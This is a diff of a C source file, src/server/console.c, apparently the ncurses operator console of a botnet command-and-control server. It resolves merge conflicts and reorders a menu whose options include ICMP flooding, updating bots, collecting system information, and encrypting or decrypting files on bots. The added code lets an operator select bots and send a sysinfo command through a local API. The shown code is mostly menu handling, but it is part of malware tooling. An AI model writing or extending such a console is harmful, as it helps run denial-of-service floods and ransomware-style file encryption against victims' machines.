@@ -34,9 +34,9 @@ const char *menu_options[NUM_OPTIONS] = {
     "Get Botfile's Last Lines",
     "Update bots",
     "ICMP Flooding",
+    "Get sysinfo",
     "Encrypt",
     "Decrypt",
-    "Get sysinfo",
     "Quit"
 };
 
@@ -161,13 +161,13 @@ void *interactive_menu() {
                         icmp_flood();
                         break;
                     case 7:
-                        encrypt_file_on_bot();
+                        sysinfo_bots();
                         break;
                     case 8:
-                        decrypt_file_on_bot();
+                        encrypt_file_on_bot();
                         break;
                     case 9:
-                        sysinfo_bots();
+                        decrypt_file_on_bot();
                         break;
                 }
             }
@@ -2139,12 +2139,6 @@ void icmp_flood() {
     refresh(); getch();
 }
 
-<<<<<<< src/server/console.c
-void encrypt_file_on_bot() {
-    // --- 1. Select a bot ---
-    CURL *curl = curl_easy_init();
-    if (!curl) return;
-=======
 void sysinfo_bots(){
     CURL *curl = curl_easy_init();
     if (!curl) {
@@ -2157,14 +2151,10 @@ void sysinfo_bots(){
         return;
     }
 
->>>>>>> src/server/console.c
     char response[4096] = {0};
     curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api/bots");
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
-<<<<<<< src/server/console.c
-    if (curl_easy_perform(curl) != CURLE_OK) {
-=======
 
     CURLcode res = curl_easy_perform(curl);
     if (res != CURLE_OK) {
@@ -2174,7 +2164,6 @@ void sysinfo_bots(){
         attroff(A_BOLD | COLOR_PAIR(4));
         refresh();
         getch();
->>>>>>> src/server/console.c
         curl_easy_cleanup(curl);
         return;
     }
@@ -2182,38 +2171,6 @@ void sysinfo_bots(){
 
     cJSON *parsed_json = cJSON_Parse(response);
     if (!parsed_json || !cJSON_IsArray(parsed_json)) {
-<<<<<<< src/server/console.c
-        if (parsed_json) cJSON_Delete(parsed_json);
-        return;
-    }
-    int total_bots = cJSON_GetArraySize(parsed_json);
-    if (total_bots == 0) {
-        cJSON_Delete(parsed_json);
-        return;
-    }
-    int highlight = 0, ch;
-    char selected_bot[256] = "None";
-    while (1) {
-        clear();
-        mvprintw(0, 0, "Select a Bot (Press 'q' to cancel):");
-        for (int i = 0; i < total_bots; i++) {
-            cJSON *bot = cJSON_GetArrayItem(parsed_json, i);
-            cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
-            if (cJSON_IsString(id_obj)) {
-                if (i == highlight) {
-                    attron(A_BOLD | COLOR_PAIR(1));
-                    mvprintw(i + 1, 0, "> %s", id_obj->valuestring);
-                    attroff(A_BOLD | COLOR_PAIR(1));
-                    strncpy(selected_bot, id_obj->valuestring, sizeof(selected_bot) - 1);
-                    selected_bot[sizeof(selected_bot) - 1] = '\0';
-                } else {
-                    mvprintw(i + 1, 0, "  %s", id_obj->valuestring);
-                }
-            }
-        }
-        mvprintw(LINES - 1, 0, "Selected Bot: %s | Press 'q' to cancel", selected_bot);
-        refresh();
-=======
         clear();
         attron(A_BOLD | COLOR_PAIR(4));
         print_wrapped(4, 0, "Failed to parse JSON response.");
@@ -2256,12 +2213,255 @@ void sysinfo_bots(){
 
         refresh();
 
->>>>>>> src/server/console.c
         ch = getch();
         if (ch == 'q') {
             cJSON_Delete(parsed_json);
             return;
-<<<<<<< src/server/console.c
+        } else if (ch == 'A' || ch == 'a') {
+            // Add a bot
+            // Parse selected_bots into array
+            char *selected_bot_list[256];
+            int selected_count = 0;
+            char temp_selected_bots[4096];
+            strncpy(temp_selected_bots, selected_bots, sizeof(temp_selected_bots) - 1);
+            temp_selected_bots[sizeof(temp_selected_bots) - 1] = '\0';
+
+            char *token = strtok(temp_selected_bots, ",");
+            while (token != NULL && selected_count < 256) {
+                selected_bot_list[selected_count++] = token;
+                token = strtok(NULL, ",");
+            }
+
+            // Filtered list of bots not already selected
+            int filtered_count = 0;
+            cJSON *filtered_bots[256];
+            for (int i = 0; i < total_bots; i++) {
+                cJSON *bot = cJSON_GetArrayItem(parsed_json, i);
+                cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
+                if (cJSON_IsString(id_obj)) {
+                    bool already_selected = false;
+                    for (int j = 0; j < selected_count; j++) {
+                        if (strcmp(id_obj->valuestring, selected_bot_list[j]) == 0) {
+                            already_selected = true;
+                            break;
+                        }
+                    }
+                    if (!already_selected) {
+                        filtered_bots[filtered_count++] = bot;
+                    }
+                }
+            }
+
+            highlight = 0;
+            while (filtered_count > 0) {
+                clear();
+                attron(A_BOLD | COLOR_PAIR(3));
+                mvprintw(0, 0, "Select a Bot to Add (Press 'q' to Cancel):");
+                attroff(A_BOLD | COLOR_PAIR(3));
+                for (int i = 0; i < filtered_count; i++) {
+                    cJSON *bot = filtered_bots[i];
+                    cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
+                    cJSON *status_obj = cJSON_GetObjectItem(bot, "status");
+                    if (cJSON_IsString(id_obj) && cJSON_IsString(status_obj)) {
+                        if (i == highlight) {
+                            attron(A_BOLD | COLOR_PAIR(1));
+                            mvprintw(i + 1, 0, "> %s (%s)", id_obj->valuestring, status_obj->valuestring);
+                            attroff(A_BOLD | COLOR_PAIR(1));
+                        } else {
+                            attron(COLOR_PAIR(2));
+                            mvprintw(i + 1, 0, "  %s (%s)", id_obj->valuestring, status_obj->valuestring);
+                            attroff(COLOR_PAIR(2));
+                        }
+                    }
+                }
+                refresh();
+                ch = getch();
+                if (ch == 'q') break;
+                else if (ch == KEY_UP) highlight = (highlight - 1 + filtered_count) % filtered_count;
+                else if (ch == KEY_DOWN) highlight = (highlight + 1) % filtered_count;
+                else if (ch == '\n') {
+                    cJSON *selected_bot = filtered_bots[highlight];
+                    cJSON *id_obj = cJSON_GetObjectItem(selected_bot, "id");
+                    if (cJSON_IsString(id_obj)) {
+                        if (strlen(selected_bots) > 0)
+                            strncat(selected_bots, ",", sizeof(selected_bots) - strlen(selected_bots) - 1);
+                        strncat(selected_bots, id_obj->valuestring, sizeof(selected_bots) - strlen(selected_bots) - 1);
+                    }
+                    break;
+                }
+            }
+        } else if (ch == 'R' || ch == 'r') {
+            // Remove a bot
+            if (strlen(selected_bots) == 0) {
+                clear();
+                attron(A_BOLD | COLOR_PAIR(2));
+                mvprintw(0, 0, "Select a Bot to Remove (Press 'q' to Cancel):");
+                attroff(A_BOLD | COLOR_PAIR(2));
+                attron(A_BOLD | COLOR_PAIR(4));
+                print_wrapped(1, 0, "No bots to remove.");
+                attroff(A_BOLD | COLOR_PAIR(4));
+                refresh();
+                getch();
+                continue;
+            }
+            // Split selected_bots into array
+            char *bot_list[256];
+            int bot_count = 0;
+            char temp_selected_bots[1024];
+            strncpy(temp_selected_bots, selected_bots, sizeof(temp_selected_bots) - 1);
+            temp_selected_bots[sizeof(temp_selected_bots) - 1] = '\0';
+
+            char *token = strtok(temp_selected_bots, ",");
+            while (token != NULL && bot_count < 256) {
+                bot_list[bot_count++] = token;
+                token = strtok(NULL, ",");
+            }
+
+            highlight = 0;
+            while (bot_count > 0) {
+                clear();
+                attron(A_BOLD | COLOR_PAIR(3));
+                mvprintw(0, 0, "Select a Bot to Remove (Press 'q' to Cancel):");
+                attroff(A_BOLD | COLOR_PAIR(3));
+                for (int i = 0; i < bot_count; i++) {
+                    if (i == highlight) {
+                        attron(A_BOLD | COLOR_PAIR(4)); // Highlight the selected bot in red
+                        mvprintw(i + 1, 0, "> %s", bot_list[i]);
+                        attroff(A_BOLD | COLOR_PAIR(4));
+                    } else {
+                        attron(COLOR_PAIR(2)); // Normal bots in white
+                        mvprintw(i + 1, 0, "  %s", bot_list[i]);
+                        attroff(COLOR_PAIR(2));
+                    }
+                }
+                refresh();
+                ch = getch();
+                if (ch == 'q') break;
+                else if (ch == KEY_UP) highlight = (highlight - 1 + bot_count) % bot_count;
+                else if (ch == KEY_DOWN) highlight = (highlight + 1) % bot_count;
+                else if (ch == '\n') {
+                    for (int i = highlight; i < bot_count - 1; i++)
+                        bot_list[i] = bot_list[i + 1];
+                    bot_count--;
+                    selected_bots[0] = '\0';
+                    for (int i = 0; i < bot_count; i++) {
+                        if (i > 0)
+                            strncat(selected_bots, ",", sizeof(selected_bots) - strlen(selected_bots) - 1);
+                        strncat(selected_bots, bot_list[i], sizeof(selected_bots) - strlen(selected_bots) - 1);
+                    }
+                    break;
+                }
+            }
+        } else if (ch == 'C' || ch == 'c') {
+            // Continue to update
+            break;
+        }
+    }
+
+    cJSON_Delete(parsed_json);
+
+    // Call the update API
+    if (strlen(selected_bots) == 0) {
+        clear();
+        attron(A_BOLD | COLOR_PAIR(4));
+        print_wrapped(4, 0, "No bots selected to get sysinfo.");
+        attroff(A_BOLD | COLOR_PAIR(4));
+        refresh();
+        getch();
+        return;
+    }
+
+    char post_data[2048];
+    snprintf(post_data, sizeof(post_data), "bot_ids=%s", selected_bots);
+
+    curl = curl_easy_init();
+    if (!curl) {
+        attron(A_BOLD | COLOR_PAIR(4));
+        print_wrapped(7, 0, "Failed to initialize CURL.");
+        attroff(A_BOLD | COLOR_PAIR(4));
+        refresh();
+        return;
+    }
+
+    memset(response, 0, sizeof(response));
+    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api/sysinfo");
+    curl_easy_setopt(curl, CURLOPT_POST, 1L);
+    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+
+    res = curl_easy_perform(curl);
+    if (res != CURLE_OK) {
+        attron(A_BOLD | COLOR_PAIR(4));
+        print_wrapped(8, 0, "Failed to send sysinfo command: %s", curl_easy_strerror(res));
+        attroff(A_BOLD | COLOR_PAIR(4));
+        refresh();
+        curl_easy_cleanup(curl);
+        return;
+    }
+    curl_easy_cleanup(curl);
+
+    // Display the server's response
+    attron(A_BOLD | COLOR_PAIR(3));
+    print_wrapped(9, 0, "Sysinfo sent. Server response:");
+    attroff(A_BOLD | COLOR_PAIR(3));
+    print_wrapped(10, 0, "%s", response);
+
+    refresh();
+    getch();
+}
+
+
+void encrypt_file_on_bot() {
+    // --- 1. Select a bot ---
+    CURL *curl = curl_easy_init();
+    if (!curl) return;
+    char response[4096] = {0};
+    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api/bots");
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
+    if (curl_easy_perform(curl) != CURLE_OK) {
+        curl_easy_cleanup(curl);
+        return;
+    }
+    curl_easy_cleanup(curl);
+
+    cJSON *parsed_json = cJSON_Parse(response);
+    if (!parsed_json || !cJSON_IsArray(parsed_json)) {
+        if (parsed_json) cJSON_Delete(parsed_json);
+        return;
+    }
+    int total_bots = cJSON_GetArraySize(parsed_json);
+    if (total_bots == 0) {
+        cJSON_Delete(parsed_json);
+        return;
+    }
+    int highlight = 0, ch;
+    char selected_bot[256] = "None";
+    while (1) {
+        clear();
+        mvprintw(0, 0, "Select a Bot (Press 'q' to cancel):");
+        for (int i = 0; i < total_bots; i++) {
+            cJSON *bot = cJSON_GetArrayItem(parsed_json, i);
+            cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
+            if (cJSON_IsString(id_obj)) {
+                if (i == highlight) {
+                    attron(A_BOLD | COLOR_PAIR(1));
+                    mvprintw(i + 1, 0, "> %s", id_obj->valuestring);
+                    attroff(A_BOLD | COLOR_PAIR(1));
+                    strncpy(selected_bot, id_obj->valuestring, sizeof(selected_bot) - 1);
+                    selected_bot[sizeof(selected_bot) - 1] = '\0';
+                } else {
+                    mvprintw(i + 1, 0, "  %s", id_obj->valuestring);
+                }
+            }
+        }
+        mvprintw(LINES - 1, 0, "Selected Bot: %s | Press 'q' to cancel", selected_bot);
+        refresh();
+        ch = getch();
+        if (ch == 'q') {
+            cJSON_Delete(parsed_json);
+            return;
         } else if (ch == KEY_UP) {
             highlight = (highlight - 1 + total_bots) % total_bots;
         } else if (ch == KEY_DOWN) {
@@ -2445,193 +2645,11 @@ void decrypt_file_on_bot() {
     curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
     curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
     if (curl_easy_perform(curl) != CURLE_OK) {
-=======
-        } else if (ch == 'A' || ch == 'a') {
-            // Add a bot
-            // Parse selected_bots into array
-            char *selected_bot_list[256];
-            int selected_count = 0;
-            char temp_selected_bots[4096];
-            strncpy(temp_selected_bots, selected_bots, sizeof(temp_selected_bots) - 1);
-            temp_selected_bots[sizeof(temp_selected_bots) - 1] = '\0';
-
-            char *token = strtok(temp_selected_bots, ",");
-            while (token != NULL && selected_count < 256) {
-                selected_bot_list[selected_count++] = token;
-                token = strtok(NULL, ",");
-            }
-
-            // Filtered list of bots not already selected
-            int filtered_count = 0;
-            cJSON *filtered_bots[256];
-            for (int i = 0; i < total_bots; i++) {
-                cJSON *bot = cJSON_GetArrayItem(parsed_json, i);
-                cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
-                if (cJSON_IsString(id_obj)) {
-                    bool already_selected = false;
-                    for (int j = 0; j < selected_count; j++) {
-                        if (strcmp(id_obj->valuestring, selected_bot_list[j]) == 0) {
-                            already_selected = true;
-                            break;
-                        }
-                    }
-                    if (!already_selected) {
-                        filtered_bots[filtered_count++] = bot;
-                    }
-                }
-            }
-
-            highlight = 0;
-            while (filtered_count > 0) {
-                clear();
-                attron(A_BOLD | COLOR_PAIR(3));
-                mvprintw(0, 0, "Select a Bot to Add (Press 'q' to Cancel):");
-                attroff(A_BOLD | COLOR_PAIR(3));
-                for (int i = 0; i < filtered_count; i++) {
-                    cJSON *bot = filtered_bots[i];
-                    cJSON *id_obj = cJSON_GetObjectItem(bot, "id");
-                    cJSON *status_obj = cJSON_GetObjectItem(bot, "status");
-                    if (cJSON_IsString(id_obj) && cJSON_IsString(status_obj)) {
-                        if (i == highlight) {
-                            attron(A_BOLD | COLOR_PAIR(1));
-                            mvprintw(i + 1, 0, "> %s (%s)", id_obj->valuestring, status_obj->valuestring);
-                            attroff(A_BOLD | COLOR_PAIR(1));
-                        } else {
-                            attron(COLOR_PAIR(2));
-                            mvprintw(i + 1, 0, "  %s (%s)", id_obj->valuestring, status_obj->valuestring);
-                            attroff(COLOR_PAIR(2));
-                        }
-                    }
-                }
-                refresh();
-                ch = getch();
-                if (ch == 'q') break;
-                else if (ch == KEY_UP) highlight = (highlight - 1 + filtered_count) % filtered_count;
-                else if (ch == KEY_DOWN) highlight = (highlight + 1) % filtered_count;
-                else if (ch == '\n') {
-                    cJSON *selected_bot = filtered_bots[highlight];
-                    cJSON *id_obj = cJSON_GetObjectItem(selected_bot, "id");
-                    if (cJSON_IsString(id_obj)) {
-                        if (strlen(selected_bots) > 0)
-                            strncat(selected_bots, ",", sizeof(selected_bots) - strlen(selected_bots) - 1);
-                        strncat(selected_bots, id_obj->valuestring, sizeof(selected_bots) - strlen(selected_bots) - 1);
-                    }
-                    break;
-                }
-            }
-        } else if (ch == 'R' || ch == 'r') {
-            // Remove a bot
-            if (strlen(selected_bots) == 0) {
-                clear();
-                attron(A_BOLD | COLOR_PAIR(2));
-                mvprintw(0, 0, "Select a Bot to Remove (Press 'q' to Cancel):");
-                attroff(A_BOLD | COLOR_PAIR(2));
-                attron(A_BOLD | COLOR_PAIR(4));
-                print_wrapped(1, 0, "No bots to remove.");
-                attroff(A_BOLD | COLOR_PAIR(4));
-                refresh();
-                getch();
-                continue;
-            }
-            // Split selected_bots into array
-            char *bot_list[256];
-            int bot_count = 0;
-            char temp_selected_bots[1024];
-            strncpy(temp_selected_bots, selected_bots, sizeof(temp_selected_bots) - 1);
-            temp_selected_bots[sizeof(temp_selected_bots) - 1] = '\0';
-
-            char *token = strtok(temp_selected_bots, ",");
-            while (token != NULL && bot_count < 256) {
-                bot_list[bot_count++] = token;
-                token = strtok(NULL, ",");
-            }
-
-            highlight = 0;
-            while (bot_count > 0) {
-                clear();
-                attron(A_BOLD | COLOR_PAIR(3));
-                mvprintw(0, 0, "Select a Bot to Remove (Press 'q' to Cancel):");
-                attroff(A_BOLD | COLOR_PAIR(3));
-                for (int i = 0; i < bot_count; i++) {
-                    if (i == highlight) {
-                        attron(A_BOLD | COLOR_PAIR(4)); // Highlight the selected bot in red
-                        mvprintw(i + 1, 0, "> %s", bot_list[i]);
-                        attroff(A_BOLD | COLOR_PAIR(4));
-                    } else {
-                        attron(COLOR_PAIR(2)); // Normal bots in white
-                        mvprintw(i + 1, 0, "  %s", bot_list[i]);
-                        attroff(COLOR_PAIR(2));
-                    }
-                }
-                refresh();
-                ch = getch();
-                if (ch == 'q') break;
-                else if (ch == KEY_UP) highlight = (highlight - 1 + bot_count) % bot_count;
-                else if (ch == KEY_DOWN) highlight = (highlight + 1) % bot_count;
-                else if (ch == '\n') {
-                    for (int i = highlight; i < bot_count - 1; i++)
-                        bot_list[i] = bot_list[i + 1];
-                    bot_count--;
-                    selected_bots[0] = '\0';
-                    for (int i = 0; i < bot_count; i++) {
-                        if (i > 0)
-                            strncat(selected_bots, ",", sizeof(selected_bots) - strlen(selected_bots) - 1);
-                        strncat(selected_bots, bot_list[i], sizeof(selected_bots) - strlen(selected_bots) - 1);
-                    }
-                    break;
-                }
-            }
-        } else if (ch == 'C' || ch == 'c') {
-            // Continue to update
-            break;
-        }
-    }
-
-    cJSON_Delete(parsed_json);
-
-    // Call the update API
-    if (strlen(selected_bots) == 0) {
-        clear();
-        attron(A_BOLD | COLOR_PAIR(4));
-        print_wrapped(4, 0, "No bots selected to get sysinfo.");
-        attroff(A_BOLD | COLOR_PAIR(4));
-        refresh();
-        getch();
-        return;
-    }
-
-    char post_data[2048];
-    snprintf(post_data, sizeof(post_data), "bot_ids=%s", selected_bots);
-
-    curl = curl_easy_init();
-    if (!curl) {
-        attron(A_BOLD | COLOR_PAIR(4));
-        print_wrapped(7, 0, "Failed to initialize CURL.");
-        attroff(A_BOLD | COLOR_PAIR(4));
-        refresh();
-        return;
-    }
-
-    memset(response, 0, sizeof(response));
-    curl_easy_setopt(curl, CURLOPT_URL, "http://127.0.0.1:8000/api/sysinfo");
-    curl_easy_setopt(curl, CURLOPT_POST, 1L);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-    curl_easy_setopt(curl, CURLOPT_WRITEDATA, response);
-
-    res = curl_easy_perform(curl);
-    if (res != CURLE_OK) {
-        attron(A_BOLD | COLOR_PAIR(4));
-        print_wrapped(8, 0, "Failed to send sysinfo command: %s", curl_easy_strerror(res));
-        attroff(A_BOLD | COLOR_PAIR(4));
-        refresh();
->>>>>>> src/server/console.c
         curl_easy_cleanup(curl);
         return;
     }
     curl_easy_cleanup(curl);
 
-<<<<<<< src/server/console.c
     cJSON *parsed_json = cJSON_Parse(response);
     if (!parsed_json || !cJSON_IsArray(parsed_json)) {
         if (parsed_json) cJSON_Delete(parsed_json);
@@ -2841,14 +2859,3 @@ void decrypt_file_on_bot() {
         cJSON_Delete(response_json);
     }
 }
-=======
-    // Display the server's response
-    attron(A_BOLD | COLOR_PAIR(3));
-    print_wrapped(9, 0, "Sysinfo sent. Server response:");
-    attroff(A_BOLD | COLOR_PAIR(3));
-    print_wrapped(10, 0, "%s", response);
-
-    refresh();
-    getch();
-}
->>>>>>> src/server/console.c
